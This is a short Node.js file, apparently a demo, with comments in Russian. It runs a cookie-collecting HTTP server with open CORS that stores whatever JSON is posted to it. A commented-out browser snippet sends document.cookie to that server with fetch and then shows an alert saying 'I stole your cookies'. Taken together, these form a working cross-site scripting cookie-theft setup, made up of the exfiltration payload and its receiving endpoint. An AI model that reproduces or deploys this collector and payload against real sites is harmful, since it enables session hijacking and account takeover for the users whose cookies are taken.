'use strict'

const http = require('http')

let cookies = []

http.createServer((req, res) => {
    if (req.method === 'OPTIONS') {
        res.writeHead(200, {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Headers': '*'
        })
        res.end('OK')
    }
    if (req.method === 'POST') {
        let body = ''
        req.on('data', chunk => {
            body += chunk
        })
        req.on('end', () => {
            let json = JSON.parse(body)
            cookies.push(json)
        })
        res.writeHead(200, {
            'Content-Type': 'text/plain',
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Headers': '*'
        })
        res.end('Ok')
    }
}).listen(4200, () => console.log('Сервер работает'))



// fetch('http://localhost:4200', {
//     method: 'post',
//     body: JSON.stringify(document.cookie),
//     headers: {
//         'content-type': 'application/json'
//     }
// }).then(alert('Я украл Ваши куки'))

